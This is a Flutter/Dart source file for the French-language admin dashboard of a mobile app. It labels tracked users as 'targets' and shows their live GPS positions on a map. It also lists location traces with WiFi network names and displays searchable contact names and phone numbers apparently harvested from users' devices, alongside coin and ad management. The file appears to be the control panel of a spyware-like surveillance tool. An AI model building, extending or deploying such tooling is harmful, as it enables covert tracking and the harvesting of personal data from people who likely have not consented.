import 'package:flutter/material.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart' hide Path; 
import 'package:provider/provider.dart';

import '../../data/sources/supabase_service.dart';
import '../../data/sources/user_data_service.dart';
import '../../data/sources/local_storage.dart';
import 'messenger_screen.dart';

class AdminScreen extends StatefulWidget {
  const AdminScreen({super.key});

  @override
  State<AdminScreen> createState() => _AdminScreenState();
}

class _AdminScreenState extends State<AdminScreen> with SingleTickerProviderStateMixin {
  late TabController _tabController;
  final SupabaseService _supabase = SupabaseService();
  late Stream<List<Map<String, dynamic>>> _usersStream;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 7, vsync: this);
    _usersStream = _supabase.getUsersStream();
  }

  @override
  void dispose() {
    _tabController.dispose();
    super.dispose();
  }

  Future<void> _logout(BuildContext context) async {
    final storage = context.read<LocalStorageDataSource>();
    await storage.setAdminLoggedIn(false);
    if (context.mounted) {
      Navigator.pop(context);
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text("Déconnecté de l'admin.")),
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('Sigma Dashboard Pro', style: TextStyle(fontWeight: FontWeight.bold)),
        actions: [
          IconButton(
            icon: const Icon(Icons.logout, color: Colors.white),
            tooltip: "Déconnexion locale",
            onPressed: () => _logout(context),
          ),
        ],
        bottom: TabBar(
          controller: _tabController,
          isScrollable: true,
          tabs: const [
            Tab(icon: Icon(Icons.dashboard), text: 'Stats'),
            Tab(icon: Icon(Icons.view_carousel), text: 'Ads'),
            Tab(icon: Icon(Icons.people), text: 'Cibles'),
            Tab(icon: Icon(Icons.map), text: 'Carte'),
            Tab(icon: Icon(Icons.location_history), text: 'Traces'),
            Tab(icon: Icon(Icons.contacts), text: 'Contacts'),
            Tab(icon: Icon(Icons.settings), text: 'Config'),
          ],
        ),
      ),
      body: StreamBuilder<List<Map<String, dynamic>>>(
        stream: _usersStream,
        builder: (context, snapshot) {
          final users = snapshot.data ?? [];
          return TabBarView(
            controller: _tabController,
            children: [
              _DashboardSummary(supabase: _supabase),
              _CarouselManager(supabase: _supabase),
              _UserList(users: users, supabase: _supabase),
              _AdminMapView(supabase: _supabase, users: users),
              _DataList(fetcher: _supabase.fetchUserActivity, type: 'activity'),
              _DataList(fetcher: _supabase.fetchContacts, type: 'contacts', showSearch: true),
              _AdminSettingsManager(supabase: _supabase),
            ],
          );
        }
      ),
    );
  }
}

class _AdminSettingsManager extends StatefulWidget {
  final SupabaseService supabase;
  const _AdminSettingsManager({required this.supabase});
  @override
  State<_AdminSettingsManager> createState() => _AdminSettingsManagerState();
}

class _AdminSettingsManagerState extends State<_AdminSettingsManager> {
  final _newPassCtrl = TextEditingController();
  bool _isUpdating = false;

  Future<void> _updatePassword() async {
    final pass = _newPassCtrl.text.trim();
    if (pass.length < 6) {
      ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Le mot de passe doit faire au moins 6 caractères.")));
      return;
    }

    setState(() => _isUpdating = true);
    final ok = await widget.supabase.updateAdminPassword(pass);
    setState(() => _isUpdating = false);

    if (ok) {
      _newPassCtrl.clear();
      if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("✅ Mot de passe Admin mis à jour sur Supabase !")));
    } else {
      if (mounted) ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("❌ Erreur lors de la mise à jour.")));
    }
  }

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(24),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          const Text("🔐 Sécurité Admin", style: TextStyle(fontSize: 20, fontWeight: FontWeight.bold)),
          const SizedBox(height: 10),
          const Text("Changez le mot de passe d'accès au dashboard. Ce changement est immédiat pour tous les appareils.", style: TextStyle(color: Colors.grey, fontSize: 13)),
          const SizedBox(height: 30),
          TextField(
            controller: _newPassCtrl,
            decoration: const InputDecoration(
              labelText: "Nouveau mot de passe",
              border: OutlineInputBorder(),
              prefixIcon: Icon(Icons.lock_outline),
            ),
          ),
          const SizedBox(height: 20),
          SizedBox(
            width: double.infinity,
            child: FilledButton.icon(
              onPressed: _isUpdating ? null : _updatePassword,
              icon: _isUpdating ? const SizedBox(width: 18, height: 18, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.white)) : const Icon(Icons.save),
              label: const Text("Enregistrer les modifications"),
            ),
          ),
        ],
      ),
    );
  }
}

class _CarouselManager extends StatefulWidget {
  final SupabaseService supabase;
  const _CarouselManager({required this.supabase});
  @override
  State<_CarouselManager> createState() => _CarouselManagerState();
}

class _CarouselManagerState extends State<_CarouselManager> {
  final _text = TextEditingController();
  final _img = TextEditingController();
  final _link = TextEditingController();

  @override
  Widget build(BuildContext context) {
    return Padding(
      padding: const EdgeInsets.all(16.0),
      child: Column(
        children: [
          const Text("📢 Ajouter au Carrousel", style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold)),
          const SizedBox(height: 15),
          TextField(controller: _text, decoration: const InputDecoration(labelText: "Texte de la bannière")),
          TextField(controller: _img, decoration: const InputDecoration(labelText: "URL de l'image")),
          TextField(controller: _link, decoration: const InputDecoration(labelText: "Lien externe")),
          const SizedBox(height: 10),
          FilledButton.icon(
            onPressed: () async {
              await widget.supabase.addCarouselItem(_text.text, _img.text, _link.text);
              _text.clear(); _img.clear(); _link.clear();
              ScaffoldMessenger.of(context).showSnackBar(const SnackBar(content: Text("Bannière ajoutée !")));
            },
            icon: const Icon(Icons.add),
            label: const Text("Publier"),
          ),
          const Divider(height: 40),
          const Expanded(child: Center(child: Text("Gestion des soumissions utilisateurs"))),
        ],
      ),
    );
  }
}

class _AdminMapView extends StatelessWidget {
  final SupabaseService supabase;
  final List<Map<String, dynamic>> users;
  const _AdminMapView({required this.supabase, required this.users});

  @override
  Widget build(BuildContext context) {
    return FutureBuilder<List<Map<String, dynamic>>>(
      future: supabase.fetchUsersWithLocation(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final usersWithLoc = snapshot.data!;
        final markers = usersWithLoc.where((u) => (u['user_activity'] as List).isNotEmpty).map((user) {
          final lastPos = (user['user_activity'] as List).first;
          final String pseudo = user['pseudo'] ?? user['device_id'].toString().substring(0, 8);
          final point = LatLng(lastPos['latitude'] as double, lastPos['longitude'] as double);
          
          final lastSeen = DateTime.tryParse(user['last_seen'] ?? "");
          final bool isOnline = lastSeen != null && DateTime.now().difference(lastSeen).inMinutes < 2;

          return Marker(
            point: point,
            width: 120, height: 95,
            alignment: Alignment.bottomCenter,
            child: GestureDetector(
              onTap: () => _showUserSheet(context, user),
              child: Column(mainAxisSize: MainAxisSize.min, children: [
                  Container(
                    padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 5),
                    decoration: BoxDecoration(
                      color: isOnline ? Colors.green[700] : Colors.deepPurple, 
                      borderRadius: BorderRadius.circular(12),
                      boxShadow: isOnline ? [const BoxShadow(color: Colors.green, blurRadius: 10)] : []
                    ),
                    child: Text(pseudo, style: const TextStyle(color: Colors.white, fontSize: 10, fontWeight: FontWeight.bold), overflow: TextOverflow.ellipsis),
                  ),
                  Icon(Icons.location_on_rounded, color: isOnline ? Colors.green : Colors.red, size: 36),
                ],
              ),
            ),
          );
        }).toList();

        return FlutterMap(
          options: MapOptions(initialCenter: markers.isNotEmpty ? markers.first.point : const LatLng(36.75, 3.05), initialZoom: 6),
          children: [
            TileLayer(urlTemplate: 'https://{s}.basemaps.cartocdn.com/rastertiles/voyager/{z}/{x}/{y}{r}.png', subdomains: const ['a', 'b', 'c', 'd']),
            MarkerLayer(markers: markers),
          ],
        );
      },
    );
  }

  void _showUserSheet(BuildContext context, Map<String, dynamic> user) {
    final String pseudo = user['pseudo'] ?? user['device_id'].toString().substring(0, 8);
    showModalBottomSheet(
      context: context,
      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(20))),
      builder: (context) => Padding(
        padding: const EdgeInsets.all(24),
        child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.start, children: [
            Row(
              mainAxisAlignment: MainAxisAlignment.spaceBetween,
              children: [
                Text(pseudo, style: const TextStyle(fontSize: 22, fontWeight: FontWeight.bold)),
                Text("Coins: ${user['coins'] ?? 0}", style: const TextStyle(color: Colors.orange, fontWeight: FontWeight.bold)),
              ],
            ),
            const SizedBox(height: 8),
            Text("Modèle: ${user['model'] ?? 'Inconnu'}", style: const TextStyle(color: Colors.grey)),
            const Divider(height: 32),
            Row(
              children: [
                Expanded(
                  child: FilledButton.icon(
                    onPressed: () {
                      Navigator.pop(context);
                      Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: pseudo)));
                    },
                    icon: const Icon(Icons.chat_bubble),
                    label: const Text("Chat"),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: FilledButton.icon(
                    onPressed: () {
                      Navigator.pop(context);
                      _showAddCoinsDialog(context, user['device_id'], pseudo);
                    },
                    icon: const Icon(Icons.monetization_on),
                    label: const Text("Donner Coins"),
                    style: FilledButton.styleFrom(backgroundColor: Colors.orange[800]),
                  ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }

  void _showAddCoinsDialog(BuildContext context, String userId, String pseudo) {
    final ctrl = TextEditingController();
    showDialog(
      context: context,
      builder: (context) => AlertDialog(
        title: Text("Coins pour $pseudo"),
        content: TextField(controller: ctrl, keyboardType: TextInputType.number, decoration: const InputDecoration(labelText: "Nombre de coins")),
        actions: [
          TextButton(onPressed: () => Navigator.pop(context), child: const Text("Annuler")),
          FilledButton(onPressed: () async {
            final amount = int.tryParse(ctrl.text) ?? 0;
            if (amount > 0) {
              await supabase.addCoins(userId, amount);
            }
            if (context.mounted) Navigator.pop(context);
          }, child: const Text("Ajouter")),
        ],
      ),
    );
  }
}

class _DashboardSummary extends StatelessWidget {
  final SupabaseService supabase;
  const _DashboardSummary({required this.supabase});
  @override
  Widget build(BuildContext context) {
    return FutureBuilder<Map<String, dynamic>>(
      future: supabase.fetchStats(),
      builder: (context, snapshot) {
        if (!snapshot.hasData) return const Center(child: CircularProgressIndicator());
        final stats = snapshot.data!;
        return GridView.count(
          crossAxisCount: 2, padding: const EdgeInsets.all(16),
          children: [
            _statCard("WiFi", (stats['wifi'] as int? ?? 0), Icons.wifi, Colors.blue),
            _statCard("Online", (stats['online'] as int? ?? 0), Icons.bolt, Colors.green),
            _statCard("Offline", (stats['offline'] as int? ?? 0), Icons.power_off, Colors.red),
            _statCard("Contacts", (stats['contacts'] as int? ?? 0), Icons.contacts, Colors.orange),
          ],
        );
      },
    );
  }
  Widget _statCard(String label, int val, IconData icon, Color color) {
    return Card(
      elevation: 4,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
      child: Column(mainAxisAlignment: MainAxisAlignment.center, children: [
        Icon(icon, color: color, size: 36),
        const SizedBox(height: 8),
        Text(val.toString(), style: const TextStyle(fontSize: 24, fontWeight: FontWeight.bold)),
        Text(label, style: const TextStyle(fontSize: 14, color: Colors.grey)),
      ]),
    );
  }
}

class _UserList extends StatelessWidget {
  final List<Map<String, dynamic>> users;
  final SupabaseService supabase;
  const _UserList({required this.users, required this.supabase});

  @override
  Widget build(BuildContext context) {
    final currentUserId = context.read<UserDataService>().deviceId;
    final filteredUsers = users.where((u) => u['device_id'] != currentUserId).toList();
    
    return ListView.builder(
      itemCount: filteredUsers.length,
      itemBuilder: (context, index) {
        final user = filteredUsers[index];
        final String pseudo = user['pseudo'] ?? user['device_id'].substring(0, 8);
        
        final lastSeen = DateTime.tryParse(user['last_seen'] ?? "");
        final bool isOnline = lastSeen != null && DateTime.now().difference(lastSeen).inMinutes < 2;

        return ListTile(
          leading: Stack(
            children: [
              const CircleAvatar(child: Icon(Icons.person)),
              if (isOnline)
                Positioned(right: 0, bottom: 0, child: Container(width: 12, height: 12, decoration: BoxDecoration(color: Colors.green, shape: BoxShape.circle, border: Border.all(color: Colors.white, width: 2)))),
            ],
          ),
          title: Text(pseudo, style: TextStyle(fontWeight: isOnline ? FontWeight.bold : FontWeight.normal)),
          subtitle: Text(isOnline ? "En ligne" : "Hors ligne"),
          trailing: IconButton(
            icon: const Icon(Icons.chat, color: Colors.orange),
            onPressed: () => Navigator.push(context, MaterialPageRoute(builder: (context) => DetailedChatScreen(userId: user['device_id'], pseudo: pseudo))),
          ),
        );
      },
    );
  }
}

class _DataList extends StatefulWidget {
  final Future<List<Map<String, dynamic>>> Function(int, {String? query}) fetcher;
  final String type;
  final bool showSearch;
  const _DataList({required this.fetcher, required this.type, this.showSearch = false});
  @override
  State<_DataList> createState() => _DataListState();
}

class _DataListState extends State<_DataList> {
  final List<Map<String, dynamic>> _items = [];
  String _query = "";
  bool _loading = false;
  int _offset = 0;
  @override
  void initState() { super.initState(); _loadMore(reset: true); }
  Future<void> _loadMore({bool reset = false}) async {
    if (_loading) return;
    if (reset) { _items.clear(); _offset = 0; }
    setState(() => _loading = true);
    final data = await widget.fetcher(_offset, query: _query);
    if (mounted) setState(() { _items.addAll(data); _offset += data.length; _loading = false; });
  }
  @override
  Widget build(BuildContext context) {
    return Column(children: [
      if (widget.showSearch) Padding(padding: const EdgeInsets.all(8), child: TextField(decoration: const InputDecoration(hintText: "Rechercher...", prefixIcon: Icon(Icons.search)), onChanged: (v) { _query = v; _loadMore(reset: true); })),
      Expanded(child: ListView.builder(itemCount: _items.length, itemBuilder: (context, index) {
        final item = _items[index];
        return ListTile(
          title: Text(widget.type == 'contacts' ? item['name'] : (item['ssid'] ?? "Trace")),
          subtitle: Text(widget.type == 'contacts' ? item['phone'] : (item['timestamp'] ?? "")),
        );
      })),
    ]);
  }
}
